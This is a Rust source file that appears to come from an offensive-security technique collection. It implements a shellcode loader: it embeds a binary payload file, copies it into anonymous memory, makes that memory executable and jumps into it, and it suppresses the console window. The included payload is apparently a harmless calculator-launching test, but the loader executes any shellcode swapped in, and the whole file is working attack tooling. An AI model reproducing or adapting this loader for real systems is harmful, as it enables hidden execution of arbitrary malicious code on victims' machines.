#![windows_subsystem = "windows"]

use memmap2::MmapOptions;
use std::mem::transmute;

const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
const SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut mmap = MmapOptions::new()
        .len(SIZE)
        .map_anon()
        .expect("mmap failed!");
    mmap.copy_from_slice(SHELLCODE);
    let mmap = mmap.make_exec().expect("make_exec failed!");

    unsafe {
        let shell: unsafe extern "C" fn() = transmute(mmap.as_ptr());
        shell();
    }
}
